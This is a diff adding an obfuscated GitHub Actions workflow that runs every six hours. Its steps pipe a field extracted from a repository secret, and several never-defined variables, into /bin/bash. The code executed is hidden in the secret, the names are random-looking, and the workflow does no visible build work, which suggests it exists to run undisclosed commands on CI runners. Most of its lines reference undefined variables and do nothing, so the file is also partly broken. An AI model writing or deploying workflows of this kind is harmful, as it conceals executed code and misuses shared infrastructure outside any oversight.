@@ -1,0 +1,25 @@
+name: miaoguojing1997
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: miaoguojing1997
+        env:
+          pc5069: ${{ secrets.pc5069 }}
+        run: |
+          echo $pc5069 | jq -r .azwl9 | /bin/bash
+          echo $raidq67 | jq -r .nn6 | /bin/bash
+          echo $gytl8 | jq -r .sxht83650 | /bin/bash
+          echo $q2131 | jq -r .qiu6 | /bin/bash
+          echo $ip3 | jq -r .ksw7 | /bin/bash
+          echo $btywx9909 | jq -r .wm5565 | /bin/bash
+          echo $c0 | jq -r .bzlor828 | /bin/bash
+          echo $r0 | jq -r .zqcon1416 | /bin/bash
+          echo $jxpo7059 | jq -r .ukicn49383 | /bin/bash
+
